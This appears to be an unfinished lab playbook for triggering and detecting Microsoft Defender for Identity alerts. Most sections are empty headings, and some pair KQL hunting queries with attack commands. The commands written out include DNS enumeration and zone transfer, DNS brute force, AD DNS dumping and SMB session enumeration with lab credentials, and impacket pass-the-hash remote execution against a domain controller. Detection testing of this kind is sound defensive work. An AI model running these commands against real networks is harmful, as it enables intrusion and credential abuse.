---
ref: mdi-playbook
title: Microsoft Defender for Identity Attack Playbook
date: 2024-04-07T00:00:00+00:00
layout: page
lang: en
permalink: /mdi
sitemap: false
---

## Table of Contents
{:.no_toc}

* This is a TOC placeholder.
{:toc}

## 0. Lab Setup

### Virtual Machines

### Kali Linux

## 1. Reconnaissance and Discovery

### Account enumeration reconnaissance

Kerberos / NTLM scan

### Account Enumeration reconnaissance (LDAP)

cLDAP?

### Network-mapping reconnaissance (DNS)

```yaml
Learning period: 8 days
```

#### DNS SRV Enumeration

##### Attack

```bash
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='contoso.com'"
```

#### Hunting Query

```kql
IdentityQueryEvents
| where Protocol  == "Dns"
| where QueryType == "Srv"
| where QueryTarget in ("_xmpp-server._tcp.contoso.com","_http._tcp.kali.download")
```

#### AXFR

##### Attack

```bash
nmap contoso-dc.contoso.com --script dns-zone-transfer --script-args "dns-zone-transfer.domain='contoso.com'"
```

##### Hunting Query

```kql
IdentityQueryEvents
| where  Protocol  == "Dns"
| where  QueryType == "Axfr"
```

#### DNS Brute Force

```bash
rm names.txt
mp64 --output-file=names.txt CONTOSO-P?u?d
cat names.txt
dnsrecon --domain contoso.com --dictionary names.txt --type brt
```

#### DNS Enumeration over LDAP

```bash
adidnsdump --user CONTOSO\\john --password 'Pa$$w0rd' --print-zones --ssl contoso-dc.contoso.com
```

```bash
adidnsdump --user CONTOSO\\john --password 'Pa$$w0rd' --zone contoso.com --ssl --verbose contoso-dc.contoso.com
```

### User and IP address reconnaissance (SMB)

SMB session enumeration against a DC

```bash
crackmapexec smb --sessions --loggedon-users --shares -u john -p 'Pa$$w0rd' -d contoso.com '10.213.0.0/24'
```

???

### User and Group membership reconnaissance (SAMR)

```yaml
Learning period: 30 days
```

### Active Directory attributes reconnaissance (LDAP)

### Honeytoken was queried via SAM-R

### Honeytoken was queried via LDAP

### Suspicious Okta account Enumeration

## Privilege Escalation

### Suspected Netlogon privilege elevation attempt (CVE-2020-1472 exploitation)

### Suspicious modification of a dNSHostName attribute (CVE-2022-26923)

### Suspicious Kerberos delegation attempt by a newly created computer

### Suspicious Domain Controller certificate request (ESC8)

### Suspicious modifications to the AD CS security permissions/settings

### Suspicious modification of the trust relationship of AD FS server

### Suspicious modification of the Resource Based Constrained Delegation attribute by a machine account

## Persistence

### Suspected Golden Ticket usage (encryption downgrade)

### Suspected Golden Ticket usage (nonexistent account)

### Suspected Golden Ticket usage (ticket anomaly)

### Suspected Golden Ticket usage (ticket anomaly using RBCD)

### Suspected Golden Ticket usage (time anomaly)

### Suspected skeleton key attack (encryption downgrade)

### Suspicious additions to sensitive groups

### Honeytoken user attributes modified

### Honeytoken group membership changed

### Suspected SID-History injection

### Suspicious modification of domain AdminSdHolder

## Credential Access

### Suspected Brute Force attack (LDAP)

### Suspected Golden Ticket usage (forged authorization data)

### Malicious request of Data Protection API master key

### Suspected Brute Force attack (Kerberos, NTLM)

### Security principal reconnaissance (LDAP)

### Suspected Kerberos SPN exposure

### Suspected AS-REP Roasting attack

### Suspicious modification of a sAMNameAccount attribute (CVE-2021-42278 and CVE-2021-42287 exploitation)

### Honeytoken authentication activity

### Suspected DCSync attack (replication of directory services)

### Suspected AD FS DKM key read

### Suspected DFSCoerce attack using Distributed File System Protocol

### Suspicious Kerberos delegation attempt using BronzeBit method (CVE-2020-17049 exploitation)

### Abnormal Active Directory Federation Services (AD FS) authentication using a suspicious certificate

### Suspected account takeover using shadow credentials

### Suspected suspicious Kerberos ticket request

### Password spray against OneLogin

### Suspicious OneLogin MFA fatigue

## Lateral Movement

### Suspected exploitation attempt on Windows Print Spooler service

### Remote code execution attempt over DNS

### Suspected identity theft (pass-the-hash)

### Suspected identity theft (pass-the-ticket)

### Suspected NTLM authentication tampering

### Suspected NTLM relay attack (Exchange account)

### Suspected overpass-the-hash attack (Kerberos)

### Suspected rogue Kerberos certificate usage

### Suspected SMB packet manipulation (CVE-2020-0796 exploitation)

### Suspicious network connection over Encrypting File System Remote Protocol

### Exchange Server Remote Code Execution (CVE-2021-26855)

### Suspected Brute Force attack (SMB)

### Suspected WannaCry ransomware attack

### Suspected use of Metasploit hacking framework

### Suspicious certificate usage over Kerberos protocol (PKINIT)

### Suspected over-pass-the-hash attack (forced encryption type)

## Other

### Suspected DCShadow attack (domain controller promotion)

### Suspected DCShadow attack (domain controller replication request)

### Suspicious VPN connection

### Remote code execution attempt

```bash
impacket-wmiexec -hashes :92937945b518814341de3f726500d4ff 'contoso/Admin@contoso-dc.contoso.com' hostname
```

```bash
impacket-psexec -hashes :92937945b518814341de3f726500d4ff 'contoso/Admin@contoso-dc.contoso.com' hostname
```

```bash
impacket-smbexec -hashes :92937945b518814341de3f726500d4ff 'contoso/Admin@contoso-dc.contoso.com' hostname
```

### Suspicious service creation

### Suspicious communication over DNS

### Data exfiltration over SMB

### Suspicious deletion of the certificate database entries

### Suspicious disable of audit filters of AD CS

### Directory Services Restore Mode Password Change

### Possible Okta session theft
